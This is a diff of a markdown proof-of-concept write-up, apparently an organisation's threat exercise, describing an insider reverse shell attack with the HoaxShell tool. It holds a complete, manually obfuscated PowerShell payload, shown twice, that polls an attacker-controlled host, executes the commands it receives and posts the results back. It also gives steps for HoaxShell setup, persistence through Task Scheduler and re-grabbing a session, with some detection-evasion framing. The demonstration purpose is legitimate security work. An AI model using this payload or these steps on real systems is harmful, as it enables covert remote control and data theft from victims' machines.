@@ -10,6 +10,19 @@ This attack aims to outline the threats posed to the organisation from a reverse
 
 ## Steps to Carry Out Exploitation
 
+There are a total of 2 steps to be caried out during the process of conducting a reverse shell attack.
+
+The following are the 2 steps taken during the POC.
+
+1. [Preparation Phase](#preparations)
+2. [Exploitation Phase](#exploitation)
+
+The preparation phase covers all preperatory needs inclusive of the installation of tools that can possibly prepared by the threat attacker. 
+
+The exploitation phase outlines the steps that the insider can possibly take to both remain undetected within the machine along with achieving the targeted goal of the insider threat attacker.
+
+### Preparations
+
 1. Git clone the Hoax Shell repository
 
 ```sh
@@ -32,7 +45,7 @@ python -m pip install -r requirements.txt
 sudo python3 hoaxshell.py -s <your_ip> -r -H "Authorization"
 ```
 
-![Generating Payload using HoaxShell](/images/POC_4/Exploitation/POC4_Generating_Payload.png)
+![Generating Payload using HoaxShell](/images/POC_4/Preparation/POC4_Generating_Payload.png)
 
 4. Manually obfuscating HoaxShell Script by adding `'` and `splitting strings of character`, and `randomising casing of PowerShell functions`
 
@@ -40,7 +53,9 @@ sudo python3 hoaxshell.py -s <your_ip> -r -H "Authorization"
 $xxx='None';$s='<your_ip>:8080';$i='83d2a6b0-c13433e2-5ea52d90';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/83d2a6b0 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/c13433e2 -Headers @{"Authorization"=$i}).Content;if ($c -ne $xxx) {$r=i''e''x $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/5ea52d90 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
 ```
 
-5. Run the following within a PowerShell session or Command Prompt
+### Exploitation
+
+1. Run the following within a PowerShell session or Command Prompt
 
 Command Prompt
 ```cmd
@@ -52,17 +67,17 @@ PowerShell
 $xxx='None';$s='<your_ip>:8080';$i='83d2a6b0-c13433e2-5ea52d90';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/83d2a6b0 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/c13433e2 -Headers @{"Authorization"=$i}).Content;if ($c -ne $xxx) {$r=i''e''x $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/5ea52d90 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
 ```
 
-6. Notice that the attacker machine would have a shell session established after the command has been ran
+2. Notice that the attacker machine would have a shell session established after the command has been ran
 
 ![HoaxShell Connection Established](/images/POC_4/Exploitation/POC4_HoaxShell_Session.png)
 
-7. Run the following command on the attacker system to confirm that the attacker machine is connected and able to retrieve information from the organisations device
+3. Run the following command on the attacker system to confirm that the attacker machine is connected and able to retrieve information from the organisations device
 
 ![Listing of Victim's machine directory from HoaxShell exploit script](/images/POC_4/Exploitation/POC4_Directry_Listing_from_HoaxShell.png)
 
-8. Save the PowerShell script and run it on startup using Task Scheduler
+4. Save the PowerShell script and run it on startup using Task Scheduler
 
-9. Run the following command to grab the session mode when the shell has been closed on the attacker machine but is still running on the organisations device
+5. Run the following command to grab the session mode when the shell has been closed on the attacker machine but is still running on the organisations device
 
 ```sh
 sudo python3 hoaxshell.py -s <your_ip> -g
